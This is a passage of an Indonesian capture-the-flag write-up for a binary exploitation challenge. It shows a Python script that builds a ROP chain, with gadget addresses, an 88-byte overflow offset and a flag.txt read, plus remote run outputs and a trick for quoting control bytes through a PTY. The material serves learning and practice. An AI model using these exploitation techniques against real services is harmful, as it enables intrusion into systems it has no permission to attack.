./trial_payloads.py encoded 13.127.119.28 1338
```

Potongan output:

```text
[trial] encoded
[trial] payload_len=337
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[@^@^@^@^@^@fl`f/tyt...
...
K^R
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

Yang dicari dari output ini bukan flag, tapi gejalanya:

-   Banyak echo aneh dari PTY.
    
-   Ada `^R`, itu representasi control byte `0x12`.
    
-   Tidak ada flag.
    

Ini yang bikin yakin masalahnya bukan ROP lagi, tapi transport PTY. Byte `0x12` dari alamat gadget dibaca terminal sebagai control character.

### **Trial 4:** `final` **Remote**

Payload final sama seperti encoded payload, tapi saat remote dia lewat:

```python
quote_for_pty(payload)
```

Jadi control byte seperti `0x12` dikirim sebagai literal dengan prefix `0x16`.

Run:

```bash
./trial_payloads.py final 13.127.119.28 1338
```

Output:

```text
[trial] final
[trial] payload_len=337
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[^^R@^@...
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q
TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}
```

trial\_payloads.py:

```bash
#!/usr/bin/env python3
from argparse import ArgumentParser
from struct import pack

from solve import build_payload, quote_for_pty, run_local, run_remote


def p64(value):
    return pack("<Q", value)


def payload_raw_flag_string():
    pop_r12_r13_r14_r15 = 0x40125B
    mov_r13_r12 = 0x401269
    pop_rdi = 0x401272
    ret = 0x401274
    print_file_plt = 0x401060
    fflush_plt = 0x401050
    main = 0x40124B
    writebuf = 0x404060

    payload = b"A" * 88
    payload += p64(pop_r12_r13_r14_r15)
    payload += b"flag.txt"
    payload += p64(writebuf)
    payload += p64(0)
    payload += p64(0)
    payload += p64(mov_r13_r12)
    payload += p64(pop_rdi)
    payload += p64(writebuf)
    payload += p64(ret)
    payload += p64(print_file_plt)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(ret)
    payload += p64(fflush_plt)
    payload += p64(main)
    payload += b"\n"
    return payload


def payload_encoded_no_pty_quote():
    return build_payload()


def run_payload(name, host=None, port=None):
    payloads = {
        "raw-flag": payload_raw_flag_string,
        "encoded": payload_encoded_no_pty_quote,
        "final": build_payload,
    }
    payload = payloads[name]()

    print(f"[trial] {name}")
    print(f"[trial] payload_len={len(payload)}")

    if host and port:
        if name == "encoded":
            # Intentional: no PTY quoting, to show why the service breaks.
            from socket import create_connection
            from time import sleep

            with create_connection((host, port)) as sock:
                sock.settimeout(3)
                chunks = []
                try:
                    chunks.append(sock.recv(1024))
                except TimeoutError:
                    pass
                sock.sendall(payload)
                sleep(0.2)
                sock.shutdown(1)
                while True:
                    try:
                        chunk = sock.recv(4096)
                    except TimeoutError:
                        break
                    if not chunk:
                        break
                    chunks.append(chunk)
            output = b"".join(chunks)
        else:
            output = run_remote(host, port, payload)
    else:
        output = run_local(payload)

    print(output.decode("latin-1", errors="replace"), end="")


def main():
    parser = ArgumentParser(description="Runnable intermediate payload trials")
    parser.add_argument(
        "trial",
        choices=("raw-flag", "encoded", "final"),
        help="raw-flag: wrong direct flag.txt payload; encoded: works locally but not PTY-safe remotely; final: final payload",
    )
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?", type=int)
    args = parser.parse_args()

    run_payload(args.trial, args.host, args.port)


if __name__ == "__main__":
    main()
```

Output trial\_payloads.py:

```text
~/ctf/tracebash/pwn
❯ ./trial_payloads.py final 13.127.119.28 1338                                                                                                                                   󰥔 00:36:26
[trial] final
[trial] payload_len=337
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[^R@^@^@^@^@^@fl`f/tyt`@@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@i^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@c@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@d@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@f@@^@^@^@^@^@n^R@^@^@^@^@^@r^R@^@^@^@^@^@`@@^@^@^@^@^@t^R@^@^@^@^@^@`^P@^@^@^@^@^@r^R@^@^@^@^@^@^@^@^@^@^@^@^@^@t^R@^@^@^@^@^@P^P@^@^@^@^@^@K^R@^@^@^@^@^@
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q
TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}
```

## **Exploit Final**

Remote:

```bash
~/ctf/tracebash/pwn
❯ python3 solve.py 13.127.119.28 1338                                                                                                                                            󰥔 00:33:23
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[^R@^@^@^@^@^@fl`f/tyt`@@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@i^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@b@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@c@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@d@@^@^@^@^@^@n^R@^@^@^@^@^@d^R@^@^@^@^@^@^A^@^@^@^@^@^@^@f@@^@^@^@^@^@n^R@^@^@^@^@^@r^R@^@^@^@^@^@`@@^@^@^@^@^@t^R@^@^@^@^@^@`^P@^@^@^@^@^@r^R@^@^@^@^@^@^@^@^@^@^@^@^@^@t^R@^@^@^@^@^@P^P@^@^@^@^@^@K^R@^@^@^@^@^@
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q
TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}
timeout: the monitored command dumped core
```

## **Kesimpulan**

Challenge ini bukan sekadar “overflow terus ret2win”. Ada dua filter:

-   Filter dari program: byte `x`, `g`, `a`, `.` diubah jadi NUL.
    
-   Filter dari transport: `socat` pakai `pty`, jadi byte control terminal diproses dulu.
    

Strategi final:

1.  Pakai overflow offset `88`.
    
2.  Tulis string encoded ke `writebuf`.
    
3.  Patch jadi `flag.txt` pakai gadget XOR.
    
4.  Call `print_file(writebuf)`.
    
5.  Call `fflush(NULL)` biar output aman.
    
6.  Kalau remote lewat PTY, quote control byte pakai `0x16`.
    
7.  Baca prompt dan delay sebentar sebelum shutdown.
    

Lumayan chill, tapi jebakannya layer-by-layer. Kalau cuma lihat “jalan lokal” lalu langsung gas remote, bisa banget bengong karena payload yang sama ternyata diproses beda sama PTY.
